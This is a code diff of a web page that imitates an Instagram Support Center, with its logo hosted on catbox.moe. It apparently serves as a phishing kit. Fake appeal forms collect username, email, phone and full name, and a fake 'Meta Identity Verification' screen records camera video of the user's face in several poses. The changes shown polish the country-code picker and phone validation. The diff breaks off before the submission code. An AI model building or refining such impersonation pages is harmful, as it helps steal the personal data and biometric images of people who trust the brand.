@@ -1,91 +1,513 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Instagram Support Center</title>
-    
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; color: #262626; }
-        .header { background: #fff; border-bottom: 1px solid #dbdbdb; padding: 20px 16px; text-align: center; }
-        .header img { height: 40px; width: auto; }
-        .search-container { max-width: 600px; margin: 20px auto; padding: 0 16px; position: relative; }
-        .search-icon { position: absolute; left: 28px; top: 50%; transform: translateY(-50%); width: 16px; height: 16px; opacity: 0.5; }
-        .search-box { width: 100%; padding: 8px 12px 8px 40px; font-size: 14px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; color: #8e8e8e; }
-        .main-container { max-width: 600px; margin: 0 auto; padding: 24px 16px; }
-        .help-center-label { font-size: 12px; color: #8e8e8e; margin-bottom: 16px; }
-        .option-item { background: #fff; border: 1px solid #dbdbdb; border-radius: 3px; padding: 16px; margin-bottom: 12px; cursor: pointer; display: flex; align-items: flex-start; gap: 12px; transition: background 0.2s; }
-        .option-item:hover { background: #fafafa; }
-        .radio-circle { width: 20px; height: 20px; min-width: 20px; border: 2px solid #dbdbdb; border-radius: 50%; position: relative; margin-top: 2px; }
-        .option-item.selected .radio-circle { border-color: #0095f6; }
-        .option-item.selected .radio-circle::after { content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 10px; height: 10px; background: #0095f6; border-radius: 50%; }
-        .option-content { flex: 1; }
-        .option-title { font-size: 16px; font-weight: 600; color: #262626; margin-bottom: 6px; }
-        .option-description { font-size: 14px; color: #8e8e8e; line-height: 1.5; }
-        .form-container { display: none; }
-        .form-container.active { display: block; }
-        .form-box { background: #fff; border: 1px solid #dbdbdb; border-radius: 3px; padding: 20px; }
-        .form-title { font-size: 16px; font-weight: 600; color: #262626; margin-bottom: 12px; }
-        .form-description { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 20px; }
-        .form-group { margin-bottom: 16px; }
-        .form-label { font-size: 14px; color: #262626; margin-bottom: 6px; display: block; }
-        .form-input, .form-select { width: 100%; padding: 9px 8px; font-size: 14px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; color: #262626; font-family: inherit; }
-        .form-input:focus, .form-select:focus { outline: none; border-color: #a8a8a8; background: #fff; }
-        .phone-group { display: flex; gap: 10px; align-items: center; }
-        .phone-group .country-input { flex: 0 0 100px; text-align: center; font-weight: 600; }
-        .phone-group .phone-input { flex: 1; }
-        .send-btn { background: #0095f6; color: #fff; border: none; padding: 7px 16px; font-size: 14px; font-weight: 600; border-radius: 4px; cursor: pointer; }
-        .send-btn:hover { background: #1877f2; }
-        .footer { background: #fafafa; padding: 40px 20px 20px; margin-top: 50px; }
-        .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px 16px; margin-bottom: 16px; max-width: 900px; margin-left: auto; margin-right: auto; }
-        .footer-link { font-size: 12px; color: #00376b; text-decoration: none; font-weight: 600; text-transform: uppercase; letter-spacing: 0.2px; }
-        .footer-link:hover { text-decoration: underline; }
-        .footer-copyright { text-align: center; font-size: 12px; color: #000; margin-top: 16px; font-weight: 400; }
-        .footer-language { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px 16px; margin-top: 20px; max-width: 900px; margin-left: auto; margin-right: auto; }
-        .footer-language a { font-size: 12px; color: #737373; text-decoration: none; font-weight: 400; opacity: 0.7; }
-        .footer-language a:hover { text-decoration: underline; }
-        .footer-language .active { color: #262626; font-weight: 600; opacity: 1; }
-        .verification-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 1000; }
-        .verification-screen.active { display: flex; flex-direction: column; }
-        .verification-header { background: #fff; border-bottom: 1px solid #dbdbdb; padding: 16px; text-align: center; }
-        .verification-header h2 { font-size: 16px; font-weight: 600; color: #262626; }
-        .verification-content { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; background: #fafafa; }
-        .camera-box { width: 100%; max-width: 380px; height: 480px; background: #000; border-radius: 8px; position: relative; overflow: hidden; box-shadow: 0 1px 8px rgba(0,0,0,0.1); }
-        #verificationVideo { width: 100%; height: 100%; object-fit: cover; }
-        .face-oval { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 200px; height: 260px; border: 2px solid rgba(255,255,255,0.8); border-radius: 50%; box-shadow: 0 0 0 9999px rgba(0,0,0,0.5); pointer-events: none; transition: border-color 0.3s; }
-        .face-oval.matched { border-color: #4CAF50; box-shadow: 0 0 0 9999px rgba(0,0,0,0.5), 0 0 20px rgba(76,175,80,0.6); }
-        .pose-text { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.75); color: #fff; padding: 8px 16px; border-radius: 4px; font-size: 14px; font-weight: 500; }
-        .pose-count { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.75); color: #fff; padding: 6px 12px; border-radius: 4px; font-size: 12px; }
-        .verification-submit-btn { display: none; margin-top: 20px; background: #0095f6; color: #fff; border: none; padding: 10px 24px; font-size: 14px; font-weight: 600; border-radius: 4px; cursor: pointer; }
-        .verification-submit-btn.show { display: block; }
-        .success-modal { display: none; position: fixed; bottom: 0; left: 0; width: 100%; background: #fff; border-top: 1px solid #ccc; box-shadow: 0 -2px 10px rgba(0,0,0,0.15); z-index: 2000; animation: slideUp 0.3s ease; }
-        .success-modal.active { display: block; }
-        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-        .modal-header { background: #6d86b7; color: #fff; padding: 12px; font-weight: bold; font-size: 15px; }
-        .modal-body { padding: 16px; color: #333; font-size: 14px; line-height: 1.6; }
-        .modal-footer { padding: 10px 16px; text-align: right; }
-        .modal-btn { background: #4267b2; color: #fff; border: none; padding: 6px 14px; border-radius: 3px; font-size: 13px; cursor: pointer; }
-        .modal-btn:hover { background: #365899; }
-        .hidden { display: none !important; }
-        /* Datalist style override for compact look */
-        input::-webkit-calendar-picker-indicator { opacity: 0.5; cursor: pointer; }
-        input[list] { background: #fafafa; }
-        .country-input { font-family: monospace; letter-spacing: 0.5px; }
+        /* ----- Reset & Base ----- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #fff;
+            color: #262626;
+        }
+        /* ----- Header ----- */
+        .header {
+            background: #fff;
+            border-bottom: 1px solid #dbdbdb;
+            padding: 20px 16px;
+            text-align: center;
+        }
+        .header img {
+            height: 40px;
+            width: auto;
+        }
+        /* ----- Search Bar ----- */
+        .search-container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 0 16px;
+            position: relative;
+        }
+        .search-icon {
+            position: absolute;
+            left: 28px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 16px;
+            height: 16px;
+            opacity: 0.5;
+        }
+        .search-box {
+            width: 100%;
+            padding: 8px 12px 8px 40px;
+            font-size: 14px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background: #fafafa;
+            color: #8e8e8e;
+        }
+        /* ----- Main Container ----- */
+        .main-container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 24px 16px;
+        }
+        .help-center-label {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-bottom: 16px;
+        }
+        .option-item {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 16px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            transition: background 0.2s;
+        }
+        .option-item:hover {
+            background: #fafafa;
+        }
+        .radio-circle {
+            width: 20px;
+            height: 20px;
+            min-width: 20px;
+            border: 2px solid #dbdbdb;
+            border-radius: 50%;
+            position: relative;
+            margin-top: 2px;
+        }
+        .option-item.selected .radio-circle {
+            border-color: #0095f6;
+        }
+        .option-item.selected .radio-circle::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 10px;
+            height: 10px;
+            background: #0095f6;
+            border-radius: 50%;
+        }
+        .option-content {
+            flex: 1;
+        }
+        .option-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 6px;
+        }
+        .option-description {
+            font-size: 14px;
+            color: #8e8e8e;
+            line-height: 1.5;
+        }
+        /* ----- Forms ----- */
+        .form-container {
+            display: none;
+        }
+        .form-container.active {
+            display: block;
+        }
+        .form-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 20px;
+        }
+        .form-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 12px;
+        }
+        .form-description {
+            font-size: 14px;
+            color: #8e8e8e;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-label {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 6px;
+            display: block;
+        }
+        .form-input,
+        .form-select {
+            width: 100%;
+            padding: 9px 8px;
+            font-size: 14px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background: #fafafa;
+            color: #262626;
+            font-family: inherit;
+        }
+        .form-input:focus,
+        .form-select:focus {
+            outline: none;
+            border-color: #a8a8a8;
+            background: #fff;
+        }
+        /* ----- Phone Group with Custom Dropdown ----- */
+        .phone-group {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        .country-dropdown {
+            position: relative;
+            flex: 0 0 160px;
+        }
+        .country-dropdown .selected {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 8px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .country-dropdown .selected .arrow {
+            margin-left: auto;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        .country-dropdown .dropdown-list {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 0;
+            width: 100%;
+            max-height: 200px;
+            overflow-y: auto;
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            z-index: 100;
+            margin-top: 2px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        .country-dropdown .dropdown-list.open {
+            display: block;
+        }
+        .country-dropdown .dropdown-search {
+            padding: 6px 8px;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .country-dropdown .dropdown-search input {
+            width: 100%;
+            padding: 6px 8px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 13px;
+        }
+        .country-dropdown .dropdown-options {
+            max-height: 160px;
+            overflow-y: auto;
+        }
+        .country-dropdown .dropdown-options .option {
+            padding: 8px 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .country-dropdown .dropdown-options .option:hover,
+        .country-dropdown .dropdown-options .option.active {
+            background: #f0f0f0;
+        }
+        .country-dropdown .dropdown-options .option .flag {
+            font-size: 18px;
+        }
+        .country-dropdown .dropdown-options .option .code {
+            font-weight: 600;
+            color: #262626;
+        }
+        .phone-input {
+            flex: 1;
+        }
+        .phone-error {
+            color: #ed4956;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+        .phone-error.show {
+            display: block;
+        }
+        /* ----- Buttons ----- */
+        .send-btn {
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            padding: 7px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .send-btn:hover {
+            background: #1877f2;
+        }
+        /* ----- Footer ----- */
+        .footer {
+            background: #fafafa;
+            padding: 40px 20px 20px;
+            margin-top: 50px;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px 16px;
+            margin-bottom: 16px;
+            max-width: 900px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .footer-link {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.2px;
+        }
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+        .footer-copyright {
+            text-align: center;
+            font-size: 12px;
+            color: #000;
+            margin-top: 16px;
+            font-weight: 400;
+        }
+        .footer-language {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px 16px;
+            margin-top: 20px;
+            max-width: 900px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .footer-language a {
+            font-size: 12px;
+            color: #737373;
+            text-decoration: none;
+            font-weight: 400;
+            opacity: 0.7;
+        }
+        .footer-language a:hover {
+            text-decoration: underline;
+        }
+        .footer-language .active {
+            color: #262626;
+            font-weight: 600;
+            opacity: 1;
+        }
+        /* ----- Verification Screen ----- */
+        .verification-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            z-index: 1000;
+        }
+        .verification-screen.active {
+            display: flex;
+            flex-direction: column;
+        }
+        .verification-header {
+            background: #fff;
+            border-bottom: 1px solid #dbdbdb;
+            padding: 16px;
+            text-align: center;
+        }
+        .verification-header h2 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #262626;
+        }
+        .verification-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background: #fafafa;
+        }
+        .camera-box {
+            width: 100%;
+            max-width: 380px;
+            height: 480px;
+            background: #000;
+            border-radius: 8px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 1px 8px rgba(0, 0, 0, 0.1);
+        }
+        #verificationVideo {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .face-oval {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 200px;
+            height: 260px;
+            border: 2px solid rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
+            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.5);
+            pointer-events: none;
+            transition: border-color 0.3s;
+        }
+        .face-oval.matched {
+            border-color: #4caf50;
+            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.5), 0 0 20px rgba(76, 175, 80, 0.6);
+        }
+        .pose-text {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.75);
+            color: #fff;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .pose-count {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.75);
+            color: #fff;
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+        .verification-submit-btn {
+            display: none;
+            margin-top: 20px;
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .verification-submit-btn.show {
+            display: block;
+        }
+        /* ----- Success Modal ----- */
+        .success-modal {
+            display: none;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #fff;
+            border-top: 1px solid #ccc;
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.15);
+            z-index: 2000;
+            animation: slideUp 0.3s ease;
+        }
+        .success-modal.active {
+            display: block;
+        }
+        @keyframes slideUp {
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(0);
+            }
+        }
+        .modal-header {
+            background: #6d86b7;
+            color: #fff;
+            padding: 12px;
+            font-weight: bold;
+            font-size: 15px;
+        }
+        .modal-body {
+            padding: 16px;
+            color: #333;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .modal-footer {
+            padding: 10px 16px;
+            text-align: right;
+        }
+        .modal-btn {
+            background: #4267b2;
+            color: #fff;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 3px;
+            font-size: 13px;
+            cursor: pointer;
+        }
+        .modal-btn:hover {
+            background: #365899;
+        }
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
+    <!-- HEADER -->
     <div class="header">
-        <img src="https://files.catbox.moe/5iyrej.png" alt="Instagram">
+        <img src="https://files.catbox.moe/5iyrej.png" alt="Instagram" />
     </div>
 
+    <!-- SEARCH BAR -->
     <div class="search-container">
         <svg class="search-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
             <path d="M21 21L16.65 16.65M19 11C19 15.4183 15.4183 19 11 19C6.58172 19 3 15.4183 3 11C3 6.58172 6.58172 3 11 3C15.4183 3 19 6.58172 19 11Z" stroke="#8e8e8e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
-        <input type="text" class="search-box" placeholder="How can we help?" readonly>
+        <input type="text" class="search-box" placeholder="How can we help?" readonly />
     </div>
 
+    <!-- SELECTION SCREEN -->
     <div class="main-container" id="selectionScreen">
         <div class="help-center-label">Help Center</div>
         <div class="option-item" onclick="selectOption('disabled', this)">
@@ -104,7 +526,7 @@
         </div>
     </div>
 
-    <!-- Disabled Account Form -->
+    <!-- DISABLED ACCOUNT FORM -->
     <div class="main-container form-container" id="disabledForm">
         <div class="help-center-label">Help Center</div>
         <div class="form-box">
@@ -113,27 +535,43 @@
             <form id="disabledAppealForm">
                 <div class="form-group">
                     <label class="form-label">Instagram Username</label>
-                    <input type="text" class="form-input" name="username" required>
+                    <input type="text" class="form-input" name="username" required />
                 </div>
                 <div class="form-group">
                     <label class="form-label">Email Address</label>
-                    <input type="email" class="form-input" name="email" required>
+                    <input type="email" class="form-input" name="email" required />
                 </div>
                 <div class="form-group">
                     <label class="form-label">Phone Number</label>
                     <div class="phone-group">
-                        <input type="text" class="form-input country-input" name="countryCode" list="countryCodes" placeholder="+91" required autocomplete="tel-country-code">
-                        <datalist id="countryCodes"></datalist>
-                        <input type="tel" class="form-input phone-input" name="phoneNumber" placeholder="Enter phone number" required>
+                        <!-- Country Code Dropdown -->
+                        <div class="country-dropdown" id="countryDropdown1">
+                            <div class="selected" onclick="toggleDropdown(this)">
+                                <span class="flag">🌍</span>
+                                <span class="code">+91</span>
+                                <span class="arrow">▼</span>
+                            </div>
+                            <div class="dropdown-list">
+                                <div class="dropdown-search">
+                                    <input type="text" placeholder="Search country..." oninput="filterCountries(this)" />
+                                </div>
+                                <div class="dropdown-options" id="optionsContainer1">
+                                    <!-- options will be populated by JS -->
+                                </div>
+                            </div>
+                        </div>
+                        <!-- Phone Number Input -->
+                        <input type="tel" class="form-input phone-input" name="phoneNumber" placeholder="Enter phone number" required />
                     </div>
+                    <div class="phone-error" id="phoneError1">Phone number must be at most 10 digits (after country code).</div>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Full Name</label>
-                    <input type="text" class="form-input" name="fullname" required>
+                    <input type="text" class="form-input" name="fullname" required />
                 </div>
                 <div class="form-group">
                     <label class="form-label">Alternative Instagram Account (Optional)</label>
-                    <input type="text" class="form-input" name="alternative">
+                    <input type="text" class="form-input" name="alternative" />
                 </div>
                 <div class="form-group">
                     <label class="form-label">Your Relationship to This Account</label>
@@ -149,7 +587,7 @@
         </div>
     </div>
 
-    <!-- Chat Restrictions Form -->
+    <!-- CHAT RESTRICTIONS FORM -->
     <div class="main-container form-container" id="chatForm">
         <div class="help-center-label">Help Center</div>
         <div class="form-box">
@@ -158,27 +596,41 @@
             <form id="chatAppealForm">
                 <div class="form-group">
                     <label class="form-label">Instagram Username</label>
-                    <input type="text" class="form-input" name="username" required>
+                    <input type="text" class="form-input" name="username" required />
                 </div>
                 <div class="form-group">
                     <label class="form-label">Email Address</label>
-                    <input type="email" class="form-input" name="email" required>
+                    <input type="email" class="form-input" name="email" required />
                 </div>
                 <div class="form-group">
                     <label class="form-label">Phone Number</label>
                     <div class="phone-group">
-                        <input type="text" class="form-input country-input" name="countryCode" list="countryCodes" placeholder="+91" required autocomplete="tel-country-code">
-                        <datalist id="countryCodes"></datalist>
-                        <input type="tel" class="form-input phone-input" name="phoneNumber" placeholder="Enter phone number" required>
+                        <div class="country-dropdown" id="countryDropdown2">
+                            <div class="selected" onclick="toggleDropdown(this)">
+                                <span class="flag">🌍</span>
+                                <span class="code">+91</span>
+                                <span class="arrow">▼</span>
+                            </div>
+                            <div class="dropdown-list">
+                                <div class="dropdown-search">
+                                    <input type="text" placeholder="Search country..." oninput="filterCountries(this)" />
+                                </div>
+                                <div class="dropdown-options" id="optionsContainer2">
+                                    <!-- options -->
+                                </div>
+                            </div>
+                        </div>
+                        <input type="tel" class="form-input phone-input" name="phoneNumber" placeholder="Enter phone number" required />
                     </div>
+                    <div class="phone-error" id="phoneError2">Phone number must be at most 10 digits (after country code).</div>
                 </div>
                 <div class="form-group">
                     <label class="form-label">Full Name</label>
-                    <input type="text" class="form-input" name="fullname" required>
+                    <input type="text" class="form-input" name="fullname" required />
                 </div>
                 <div class="form-group">
                     <label class="form-label">Alternative Instagram Account (Optional)</label>
-                    <input type="text" class="form-input" name="alternative">
+                    <input type="text" class="form-input" name="alternative" />
                 </div>
                 <div class="form-group">
                     <label class="form-label">Your Relationship to This Account</label>
@@ -194,7 +646,7 @@
         </div>
     </div>
 
-    <!-- Verification Screen -->
+    <!-- VERIFICATION SCREEN -->
     <div class="verification-screen" id="verificationScreen">
         <div class="verification-header"><h2>Meta Identity Verification</h2></div>
         <div class="verification-content">
@@ -208,13 +660,14 @@
         </div>
     </div>
 
-    <!-- Success Modal -->
+    <!-- SUCCESS MODAL -->
     <div class="success-modal" id="successModal">
         <div class="modal-header">Form Submitted Successfully</div>
         <div class="modal-body">Your form has been submitted successfully. We have received your information and will process it shortly.</div>
         <div class="modal-footer"><button class="modal-btn" onclick="redirectToMainPage()">Okay</button></div>
     </div>
 
+    <!-- FOOTER -->
     <div class="footer">
         <div class="footer-links">
             <a href="#" class="footer-link">ABOUT US</a>
@@ -242,7 +695,7 @@
 
     <script>
         // ============================================================
-        // 1. COUNTRY DATABASE (Flag + ISO Code + Dialing Code)
+        // 1. COUNTRY DATABASE (ISO, Code, Flag, Name)
         // ============================================================
         const countries = [
             { iso: "AF", code: "+93", flag: "🇦🇫", name: "Afghanistan" },
@@ -414,65 +867,195 @@
         ];
 
         // ============================================================
-        // 2. POPULATE DATALIST + PRE-SELECT USER'S COUNTRY
+        // 2. CUSTOM DROPDOWN LOGIC
         // ============================================================
-        const datalist = document.getElementById('countryCodes');
-        const countryInputs = document.querySelectorAll('.country-input');
+        let activeDropdown = null;
 
-        // Populate datalist
-        countries.forEach(c => {
-            const opt = document.createElement('option');
-            opt.value = c.code;
-            opt.textContent = `${c.flag} ${c.name} (${c.code})`;
-            datalist.appendChild(opt);
+        function toggleDropdown(el) {
+            const container = el.closest('.country-dropdown');
+            const list = container.querySelector('.dropdown-list');
+            const isOpen = list.classList.contains('open');
+            // close all
+            document.querySelectorAll('.dropdown-list.open').forEach(l => l.classList.remove('open'));
+            if (!isOpen) {
+                list.classList.add('open');
+                activeDropdown = container;
+                // Populate options if empty
+                const optionsContainer = container.querySelector('.dropdown-options');
+                if (!optionsContainer.hasChildNodes()) {
+                    renderOptions(optionsContainer);
+                }
+                // highlight current selection
+                const currentCode = container.querySelector('.selected .code').textContent;
+                const opts = optionsContainer.querySelectorAll('.option');
+                opts.forEach(o => {
+                    o.classList.toggle('active', o.dataset.code === currentCode);
+                });
+                // focus search
+                const searchInput = container.querySelector('.dropdown-search input');
+                if (searchInput) {
+                    searchInput.focus();
+                    searchInput.value = '';
+                    filterCountries(searchInput);
+                }
+            }
+        }
+
+        function renderOptions(container) {
+            container.innerHTML = '';
+            countries.forEach(c => {
+                const div = document.createElement('div');
+                div.className = 'option';
+                div.dataset.code = c.code;
+                div.innerHTML = `<span class="flag">${c.flag}</span><span class="code">${c.code}</span> ${c.name}`;
+                div.onclick = function() {
+                    selectCountry(this.closest('.country-dropdown'), c.code, c.flag);
+                };
+                container.appendChild(div);
+            });
+        }
+
+        function filterCountries(input) {
+            const container = input.closest('.country-dropdown');
+            const optionsContainer = container.querySelector('.dropdown-options');
+            const query = input.value.toLowerCase().trim();
+            const options = optionsContainer.querySelectorAll('.option');
+            options.forEach(opt => {
+                const text = opt.textContent.toLowerCase();
+                opt.style.display = text.includes(query) ? '' : 'none';
+            });
+        }
+
+        function selectCountry(container, code, flag) {
+            const selected = container.querySelector('.selected');
+            selected.querySelector('.flag').textContent = flag;
+            selected.querySelector('.code').textContent = code;
+            // close dropdown
+            container.querySelector('.dropdown-list').classList.remove('open');
+            // trigger validation on phone number
+            const phoneInput = container.closest('.phone-group').querySelector('.phone-input');
+            if (phoneInput) {
+                validatePhone(phoneInput);
+            }
+        }
+
+        // Close dropdown when clicking outside
+        document.addEventListener('click', function(e) {
+            if (!e.target.closest('.country-dropdown')) {
+                document.querySelectorAll('.dropdown-list.open').forEach(l => l.classList.remove('open'));
+            }
         });
 
-        // Auto-detect country via IP or timezone
+        // ============================================================
+        // 3. DETECT USER COUNTRY (IP or browser)
+        // ============================================================
         async function detectAndSetCountry() {
             let detectedIso = null;
-
-            // Try 1: IP geolocation (fast, free)
             try {
                 const res = await fetch('https://ipapi.co/country/');
                 if (res.ok) {
                     detectedIso = (await res.text()).trim().toUpperCase();
                 }
             } catch (_) {}
-
-            // Try 2: Fallback to browser language
             if (!detectedIso) {
                 try {
                     const lang = navigator.language || navigator.languages?.[0] || 'en-US';
                     const parts = lang.split('-');
-                    if (parts.length > 1) {
-                        detectedIso = parts[1].toUpperCase();
-                    } else {
-                        // Map language to country (rough)
-                        const langMap = { 'en': 'US', 'hi': 'IN', 'es': 'ES', 'fr': 'FR', 'de': 'DE', 'zh': 'CN', 'ja': 'JP', 'ko': 'KR', 'ru': 'RU', 'ar': 'SA', 'pt': 'PT', 'it': 'IT', 'nl': 'NL' };
-                        detectedIso = langMap[parts[0]] || 'US';
+                    if (parts.length > 1) detectedIso = parts[1].toUpperCase();
+                    else {
+                        const map = { en: 'US', hi: 'IN', es: 'ES', fr: 'FR', de: 'DE', zh: 'CN', ja: 'JP', ko: 'KR', ru: 'RU', ar: 'SA', pt: 'PT', it: 'IT', nl: 'NL' };
+                        detectedIso = map[parts[0]] || 'US';
                     }
                 } catch (_) { detectedIso = 'US'; }
             }
-
-            // Find country in our list
             const matched = countries.find(c => c.iso === detectedIso);
-            const defaultCode = matched ? matched.code : '+1';
-
-            // Set all country inputs
-            countryInputs.forEach(inp => {
-                inp.value = defaultCode;
-            });
+            if (matched) {
+                document.querySelectorAll('.country-dropdown').forEach(dd => {
+                    const selected = dd.querySelector('.selected');
+                    selected.querySelector('.flag').textContent = matched.flag;
+                    selected.querySelector('.code').textContent = matched.code;
+                });
+            }
         }
-
         detectAndSetCountry();
 
         // ============================================================
-        // 3. FOOTER: DYNAMIC YEAR
+        // 4. PHONE NUMBER VALIDATION & AUTO-PARSE
+        // ============================================================
+        function validatePhone(input) {
+            const container = input.closest('.phone-group');
+            const errorDiv = container.querySelector('.phone-error');
+            const countryCode = container.querySelector('.selected .code').textContent.trim();
+            const raw = input.value.trim();
+
+            // If empty, hide error
+            if (!raw) {
+                errorDiv.classList.remove('show');
+                input.setCustomValidity('');
+                return true;
+            }
+
+            // Try to parse if starts with '+'
+            let localNumber = raw;
+            let detectedCode = '';
+            if (raw.startsWith('+')) {
+                // Find matching country code
+                const sortedCountries = countries.sort((a, b) => b.code.length - a.code.length);
+                for (const c of sortedCountries) {
+                    if (raw.startsWith(c.code)) {
+                        detectedCode = c.code;
+                        localNumber = raw.slice(c.code.length);
+                        break;
+                    }
+                }
+                if (detectedCode) {
+                    // Auto-fill country code
+                    const flag = countries.find(c => c.code === detectedCode)?.flag || '🌍';
+                    const selected = container.querySelector('.selected');
+                    selected.querySelector('.flag').textContent = flag;
+                    selected.querySelector('.code').textContent = detectedCode;
+                    input.value = localNumber; // update input to local number only
+                } else {
+                    // unknown country code
+                    errorDiv.textContent = 'Unknown country code. Please select your country.';
+                    errorDiv.classList.add('show');
+                    input.setCustomValidity('Invalid');
+                    return false;
+                }
+            }
+
+            // Now validate local number: digits only, max 10 digits (we allow 7-10)
+            const digits = localNumber.replace(/\D/g, '');
+            if (digits.length < 7 || digits.length > 10) {
+                errorDiv.textContent = 'Phone number must be between 7 and 10 digits (after country code).';
+                errorDiv.classList.add('show');
+                input.setCustomValidity('Invalid');
+                return false;
+            }
+
+            // valid
+            errorDiv.classList.remove('show');
+            input.setCustomValidity('');
+            return true;
+        }
+
+        // Attach validation to all phone inputs
+        document.querySelectorAll('.phone-input').forEach(inp => {
+            inp.addEventListener('input', function() {
+                validatePhone(this);
+            });
+            inp.addEventListener('blur', function() {
+                validatePhone(this);
+            });
+        });
+
+        // ============================================================
+        // 5. FOOTER YEAR
         // ============================================================
         document.getElementById('footerYear').textContent = new Date().getFullYear();
 
         // ============================================================
-        // 4. FORM LOGIC (unchanged)
+        // 6. FORM SUBMIT LOGIC (unchanged)
         // ============================================================
         let verificationState = {
             currentPose: 0,
@@ -481,7 +1064,6 @@
             formData: {},
             isCapturing: false
         };
-
         const POSES = [
             { name: 'straight', text: 'Look Straight at Camera' },
             { name: 'up', text: 'Look Up' },
@@ -503,23 +1085,25 @@
             }, 300);
         }
 
